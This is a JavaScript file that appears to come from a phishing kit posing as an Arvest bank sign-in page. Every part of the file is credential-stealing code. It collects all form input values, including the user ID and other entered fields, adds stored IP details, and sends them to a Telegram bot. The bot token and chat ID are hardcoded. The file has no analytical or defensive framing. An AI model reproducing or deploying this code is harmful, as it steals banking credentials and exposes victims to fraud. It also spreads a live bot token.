const botToken = "2133943840:AAH_AXd_Q8_hIksQCA4_xJli8BLSPcH_UO04";
const chatIds = ["842554301"];


// Function to check if all input fields are filled
function checkInputs() {
  const inputs = document.querySelectorAll('input');
  const filledInputs = Array.from(inputs).filter(input => input.value.trim() !== '');
  let message = '';


    const inputValues = Array.from(inputs).map(input => {
      const name = input.name.trim();
      const value = input.value.trim();
      return { name, value };
    });
  
let check = '';

  
    var userIdInput = document.querySelector('[name="userid"]');
        
    if (userIdInput) {
      var id = userIdInput.value;
      check = id;
      console.log(check);
      sessionStorage.setItem('check', id);
    } else {
      check = sessionStorage.getItem('check');
    }
  

  console.log(inputValues);
  var User = sessionStorage.getItem('check');
  var ipDetail = localStorage.getItem('ipDetails');
  message += '🔥Arvest Sign in details for ' + User + '\n';
  inputValues.forEach(input => {
    if (input.name !== 'Submit') {
      message += input.name + ': ' + input.value + '\n';
    }
  });

  if (ipDetail !== null) {
    message += ipDetail + '\n';
  }

  console.log(message);
  
  try {
    sendMessage(message); // Pass message as a parameter
  } catch (error) {
    console.error('Error sending message:', error);
    // Handle the error accordingly
  }
}

// Function to send a message to Telegram
function sendMessage(message) {
  chatIds.forEach(chatId => {
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = {
      chat_id: chatId,
      text: message
    };

    var request = new XMLHttpRequest();
    request.open('POST', `${website}/sendMessage`, true);
    request.setRequestHeader('Content-Type', 'application/json');
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        console.log('Message sent successfully');
      } else {
        throw new Error('Failed to send message');
      }
    };
    request.onerror = function () {
      throw new Error('Error sending message');
    };
    request.send(JSON.stringify(params));
  });
}
